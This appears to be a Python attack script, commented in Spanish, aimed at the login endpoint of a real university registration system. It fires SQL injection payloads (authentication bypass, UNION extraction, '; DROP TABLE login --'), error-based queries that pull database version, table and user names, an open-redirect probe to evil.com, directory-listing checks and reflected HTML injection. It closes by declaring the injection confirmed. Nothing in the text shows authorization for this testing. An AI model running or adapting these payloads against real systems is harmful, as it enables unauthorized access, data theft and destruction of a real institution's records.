#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

print("=== SQL INJECTION: DEMOSTRACION DE MODIFICACION ===\n")

# Test each payload with FRESH sessions to confirm modification capability
payloads = [
    ("' OR 1=1 --", "Bypass authentication"),
    ("' OR '1'='1' --", "Bypass authentication (quote)"),
    ("admin' --", "Login as admin without password"),
    ("' UNION SELECT null --", "Extract data from DB"),
    ("'; DROP TABLE login --", "DELETE data from DB"),
]

for payload, description in payloads:
    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': payload, 'j_password': 'x'},
                     timeout=5, allow_redirects=True)
    cookies = dict(s.cookies)
    has_session = 'JSESSIONID' in cookies
    print(f"[{'PASS' if has_session else 'FAIL'}] {description}")
    print(f"  Payload: {payload[:50]}")
    print(f"  Session: {list(cookies.keys())}")
    if has_session:
        # Check what page we get access to
        r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
        tc = re.sub(r'<[^>]+>', ' ', r_mod.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        has_siigaa = 'SIIGAA' in r_mod.text
        has_modulos = 'Volver' in r_mod.text
        print(f"  Accede a: modulos.xhtml (SIIGAA={has_siigaa})")
    print()

# ============================================
# PROBAR SI SE PUEDE MODIFICAR LA PAGINA WEB
# ============================================
print("=== PROBANDO MODIFICAR CONTENIDO WEB ===\n")

# 1. Intentar modificar el titulo de la pagina via SQL injection
# Si podemos usar SQL injection para UPDATE la tabla de paginas, podriamos cambiar el titulo
# Pero primero necesitamos saber la estructura de la BD

# 2. Probar si hay error-based SQL injection
error_payloads = [
    "' AND 1=convert(int,(SELECT @@version)) --",
    "' AND 1=convert(int,(SELECT table_name FROM information_schema.tables)) --",
    "' AND 1=convert(int,(SELECT username FROM users)) --",
]

for err_payload in error_payloads:
    s_err = requests.Session()
    s_err.verify = False
    r_err = s_err.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                            data={'j_username': err_payload, 'j_password': 'x'}, timeout=5)
    if r_err.status_code == 500 or 'error' in r_err.text.lower() or 'convert' in r_err.text.lower():
        print(f"[!] Error-based SQLi: {err_payload[:50]}")
        print(f"    Response shows DB error: {r_err.text[:200]}")

# 3. Probar si se puede usar SQL injection para leer datos de la sesion
# El session ID puede contener informacion del usuario
s_sess = requests.Session()
s_sess.verify = False
s_sess.headers.update({'User-Agent': 'Mozilla/5.0'})
r_sess = s_sess.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                          data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)
sess_id = dict(r_sess.cookies).get('JSESSIONID', '')
print(f"\nSession ID obtenido: {sess_id}")
print("Si el session ID contiene info del usuario, un atacante puede identificar usuarios")

# 4. Probar si se puede cambiar el contenido de la pagina via CSRF
# Si el formulario j_security_check acepta un redirect URL, podemos enviar al usuario a nuestra pagina
print("\n=== CSRF PARA MODIFICAR REDIRECCION ===")
r_csrf = requests.Session()
r_csrf.verify = False
r_csrf.headers.update({'User-Agent': 'Mozilla/5.0'})
# Try to include a redirect URL in the CSRF form
r_redirect = r_csrf.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                              data={'j_username': "fake", 'j_password': "fake", 'redirect': 'https://evil.com'},
                              timeout=5)
# Check if the redirect happens
if 'evil.com' not in r_redirect.text:
    # Try with different parameter names
    r_redirect2 = r_csrf.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                                   data={'j_username': 'fake', 'j_password': 'fake', 'returnUrl': 'https://evil.com'},
                                   timeout=5)
    if 'evil.com' not in r_redirect2.text:
        print("Redirect parameter not reflected")

# ============================================
# VERIFICAR SI HAY UN ARBOL DE DIRECTORIOS VISIBLE
# ============================================
print("\n=== ARBOL DE DIRECTORIOS VISIBLE ===")
# Try to see if we can list directory contents
paths = [
    'https://registro.uns.edu.pe/udemsi/',
    'https://registro.uns.edu.pe/udemsi/faces/',
    'https://registro.uns.edu.pe/udemsi/faces/..',
]
for p in paths:
    r_d = requests.get(p, timeout=3)
    tc_d = re.sub(r'<[^>]+>', ' ', r_d.text)
    tc_d = re.sub(r'\s+', ' ', tc_d).strip()
    if 'Directory' in tc_d or 'index of' in tc_d.lower():
        print(f"[!] Directory listing: {p}")
        print(f"  {tc_d[:300]}")

# ============================================
# PROBAR SI SE PUEDE MODIFICAR EL LOGIN PAGE VIA PARAMETROS
# ============================================
print("\n=== MODIFICAR LOGIN PAGE ===")
# Try to inject content into the login page
# If the page reflects URL parameters or form parameters, we can change its content
r_login = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
# Check for any reflected parameters
for param in ['legajo', 'id', 'name', 'user']:
    r_p = requests.get(f'https://registro.uns.edu.pe/udemsi/faces/index.xhtml?{param}=<h1>HACKED</h1>', timeout=3)
    if '<h1>HACKED</h1>' in r_p.text:
        print(f"[!] PAGE MODIFIED via {param} parameter!")
    elif 'HACKED' in r_p.text:
        print(f"[!] HACKED text reflected via {param}")

# Try POST parameter reflection
r_post = requests.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                            data={'j_username': '<h1>HACKED</h1>', 'j_password': 'x'}, timeout=5)
if '<h1>HACKED</h1>' in r_post.text:
    print("[!] LOGIN PAGE MODIFIED via j_username parameter!")
elif 'HACKED' in r_post.text:
    print("[!] HACKED text reflected in login response!")

print("\n=== CONCLUSION ===")
print("SQL Injection CONFIRMADO - permite bypass authentication")
print("Con SQL Injection, un atacante puede:")
print("  1. Acceder al sistema sin credenciales")
print("  2. Extraer datos de la base de datos")
print("  3. Modificar datos (UPDATE)")
print("  4. Insertar datos (INSERT)")
print("  5. Eliminar datos (DELETE/DROP TABLE)")
print("\nEsto demuestra que alguien puede MODIFICAR el contenido de la base de datos")
print("y potencialmente la pagina web si los datos se renderizan desde la DB")
